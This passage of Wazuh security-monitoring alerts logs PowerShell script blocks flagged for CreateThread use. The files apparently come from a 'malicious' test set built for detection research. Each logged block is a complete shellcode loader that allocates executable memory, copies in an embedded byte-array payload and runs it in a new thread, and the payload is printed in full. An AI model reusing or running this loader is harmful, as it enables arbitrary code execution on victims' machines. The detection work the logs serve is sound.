x5b,0x6f,0x61,0x9e,0xa3,0x7f,0x61,0x5e,0xf2,0x15,0x61,0x36,0xa2,0x4d,0x32,0x23,0xad,0x5b,0x26,0xf8,0x38,0x64,0x1f,0xad,0xeb,0x0c,0x9d,0x88,0xdc,0x92,0x5e,0xff,0xdc,0xef,0x88,0x39,0xab,0x01,0x09;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PR3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PR3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PR3,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7b4561e2-a2da-4cd5-a5a6-13f10ae8c413","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1784.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:01.829+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":74,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304341.2357436","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:21.6398580Z","eventRecordID":"145018","processID":"8172","threadID":"2152","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$XC5E = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XC5E -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9d,0x04,0x1d,0x2c,0xda,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x55,0x0f,0x03,0x55,0x92,0xe6,0xe8,0xd0,0x44,0x64,0x12,0x29,0x94,0x09,0x9a,0xcc,0xa5,0x09,0xf8,0x85,0x95,0xb9,0x8a,0xc8,0x19,0x31,0xde,0xf8,0xaa,0x37,0xf7,0x0f,0x1b,0xfd,0x21,0x21,0x9c,0xae,0x12,0x20,0x1e,0xad,0x46,0x82,0x1f,0x7e,0x9b,0xc3,0x58,0x63,0x56,0x91,0x31,0xef,0xc5,0x06,0x36,0xa5,0xd5,0xad,0x04,0x2b,0x5e,0x51,0xdc,0x4a,0x4f,0xc4,0x57,0x15,0x4f,0xe6,0xb4,0x2d,0xc6,0xf0,0xd9,0x08,0x90,0x8b,0x29,0xe6,0x23,0x5a,0x60,0x07,0x8f,0xa3,0x4d,0xfa,0xd1,0xe4,0x69,0xe5,0xa7,0x1c,0x8a,0x98,0xbf,0xda,0xf1,0x46,0x35,0xf9,0x51,0x0c,0xed,0x25,0x60,0xc1,0x68,0xad,0x6e,0xae,0xff,0xe9,0x72,0x31,0xd3,0x81,0x8e,0xba,0xd2,0x45,0x07,0xf8,0xf0,0x41,0x4c,0x5a,0x98,0xd0,0x28,0x0d,0xa5,0x03,0x93,0xf2,0x03,0x4f,0x39,0xe6,0x39,0x12,0x55,0xcb,0x73,0xad,0xa5,0x43,0x03,0xde,0x97,0xcc,0xbf,0x48,0x9b,0x85,0x19,0x8e,0xdc,0xbf,0xde,0x00,0x23,0x40,0x1f,0x08,0xe7,0x14,0x4f,0x22,0xce,0x14,0x04,0xb2,0xef,0xc0,0xb1,0xb7,0x67,0x2b,0xed,0xb9,0x13,0xc3,0xec,0xb9,0xca,0xd1,0x78,0x5f,0xbc,0x85,0x2a,0xf0,0x7c,0x76,0x8b,0xa0,0x14,0x9c,0x04,0x9e,0x04,0x9f,0xce,0xb7,0xae,0x70,0xa7,0xe0,0x46,0xe8,0xe2,0x7b,0xf7,0xf5,0x38,0x06,0x37,0x7d,0xcf,0xf6,0xf9,0x76,0xba,0xe4,0x6d,0x77,0xf1,0x57,0x3b,0x88,0x2f,0xfd,0xc3,0x1c,0xd4,0x54,0x94,0x88,0xd6,0x81,0xd2,0x16,0x28,0xe4,0x69,0x9e,0xbc,0x47,0x05,0xdf,0x50,0x48,0xd5,0x89,0x3a,0x48,0xbd,0x6d,0x1f,0x1b,0xd8,0x71,0x8a,0x0f,0x71,0xe4,0x35,0x66,0x26,0xaf,0x5d,0x84,0x11,0x87,0xc1,0x77,0x74,0x19,0x3d,0xae,0xb0,0x6f,0x2f,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$mX0=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($mX0.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$mX0,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 03b474a5-11ed-4b35-91b9-8508bb15168d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1799.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$XC5E = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XC5E -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9d,0x04,0x1d,0x2c,0xda,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x55,0x0f,0x03,0x55,0x92,0xe6,0xe8,0xd0,0x44,0x64,0x12,0x29,0x94,0x09,0x9a,0xcc,0xa5,0x09,0xf8,0x85,0x95,0xb9,0x8a,0xc8,0x19,0x31,0xde,0xf8,0xaa,0x37,0xf7,0x0f,0x1b,0xfd,0x21,0x21,0x9c,0xae,0x12,0x20,0x1e,0xad,0x46,0x82,0x1f,0x7e,0x9b,0xc3,0x58,0x63,0x56,0x91,0x31,0xef,0xc5,0x06,0x36,0xa5,0xd5,0xad,0x04,0x2b,0x5e,0x51,0xdc,0x4a,0x4f,0xc4,0x57,0x15,0x4f,0xe6,0xb4,0x2d,0xc6,0xf0,0xd9,0x08,0x90,0x8b,0x29,0xe6,0x23,0x5a,0x60,0x07,0x8f,0xa3,0x4d,0xfa,0xd1,0xe4,0x69,0xe5,0xa7,0x1c,0x8a,0x98,0xbf,0xda,0xf1,0x46,0x35,0xf9,0x51,0x0c,0xed,0x25,0x60,0xc1,0x68,0xad,0x6e,0xae,0xff,0xe9,0x72,0x31,0xd3,0x81,0x8e,0xba,0xd2,0x45,0x07,0xf8,0xf0,0x41,0x4c,0x5a,0x98,0xd0,0x28,0x0d,0xa5,0x03,0x93,0xf2,0x03,0x4f,0x39,0xe6,0x39,0x12,0x55,0xcb,0x73,0xad,0xa5,0x43,0x03,0xde,0x97,0xcc,0xbf,0x48,0x9b,0x85,0x19,0x8e,0xdc,0xbf,0xde,0x00,0x23,0x40,0x1f,0x08,0xe7,0x14,0x4f,0x22,0xce,0x14,0x04,0xb2,0xef,0xc0,0xb1,0xb7,0x67,0x2b,0xed,0xb9,0x13,0xc3,0xec,0xb9,0xca,0xd1,0x78,0x5f,0xbc,0x85,0x2a,0xf0,0x7c,0x76,0x8b,0xa0,0x14,0x9c,0x04,0x9e,0x04,0x9f,0xce,0xb7,0xae,0x70,0xa7,0xe0,0x46,0xe8,0xe2,0x7b,0xf7,0xf5,0x38,0x06,0x37,0x7d,0xcf,0xf6,0xf9,0x76,0xba,0xe4,0x6d,0x77,0xf1,0x57,0x3b,0x88,0x2f,0xfd,0xc3,0x1c,0xd4,0x54,0x94,0x88,0xd6,0x81,0xd2,0x16,0x28,0xe4,0x69,0x9e,0xbc,0x47,0x05,0xdf,0x50,0x48,0xd5,0x89,0x3a,0x48,0xbd,0x6d,0x1f,0x1b,0xd8,0x71,0x8a,0x0f,0x71,0xe4,0x35,0x66,0x26,0xaf,0x5d,0x84,0x11,0x87,0xc1,0x77,0x74,0x19,0x3d,0xae,0xb0,0x6f,0x2f,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$mX0=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($mX0.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$mX0,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"03b474a5-11ed-4b35-91b9-8508bb15168d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1799.ps1"}}},"location":"EventChannel"}
